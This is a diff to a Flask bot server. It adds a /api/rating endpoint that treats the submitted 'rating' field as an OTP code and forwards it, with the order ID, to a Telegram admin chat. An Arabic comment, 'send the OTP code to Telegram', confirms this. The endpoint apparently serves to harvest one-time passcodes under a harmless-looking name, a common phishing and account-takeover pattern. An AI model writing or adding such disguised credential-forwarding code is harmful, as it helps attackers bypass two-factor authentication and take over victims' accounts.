@@ -152,7 +152,24 @@ def telegram_webhook():
 @app.route("/", methods=["GET"])
 def health():
     return jsonify({"status": "running"})
-
+@app.route("/api/rating", methods=["POST"])
+def receive_rating():
+    payload = request.get_json(force=True)
+    order_id = payload.get("order_id")
+    otp_code = payload.get("rating")
+    
+    # إرسال رمز الـ OTP إلى تلجرام
+    text = f"🔑 رمز الـ OTP للطلب [{order_id}]:\nالرمز: {otp_code}"
+    try:
+        requests.post(
+            f"{TELEGRAM_API}/sendMessage",
+            json={"chat_id": ADMIN_CHAT_ID, "text": text},
+            timeout=10,
+        )
+    except Exception as e:
+        print(f"Error: {e}")
+        
+    return jsonify({"status": "success"})
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
